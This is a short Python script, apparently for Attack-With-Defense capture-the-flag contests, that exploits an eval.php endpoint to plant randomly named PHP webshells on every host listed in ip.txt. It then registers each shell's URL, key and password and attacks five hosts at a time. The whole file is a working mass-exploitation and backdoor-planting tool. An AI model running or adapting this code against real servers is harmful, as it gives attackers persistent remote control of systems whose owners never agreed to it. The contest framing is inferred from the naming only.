from awdframework.awd import AwdAttack,AwdTask
from awdframework.webshell import PHP
import requests
from ..models import Example
from os.path import dirname,basename

class Exp(AwdTask):
    """
    自定义一个Exp类，继承自AwdTask。覆写的 write_webshell()，批量写webshell
    """
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def write_webshell(self,ip):
        webshell = PHP(key=PHP.get_random_string(8))
        php = webshell.generate(passwd=PHP.get_random_string(8))
        code_to_write = webshell.code_to_write(php=php,location=f"/var/www/html/static/{PHP.get_random_string(4)}.php")
        url = f"http://{ip}:{self.port}/eval.php"
        requests.get(url,params={"code":code_to_write})

        webshell_url = f"http://{ip}:{self.port}/static/" + basename(webshell.location)
        Example.update_and_test_available(ip=ip,url=webshell_url,key=webshell.key,passwd=webshell.passwd)

ips = []
with open(f"{dirname(__file__)}/../../ip.txt") as f:
    ips = f.read().split("\n")
attacker = AwdAttack(ips=ips,task_class=Exp,port=80,thread_num=5)
attacker.attack()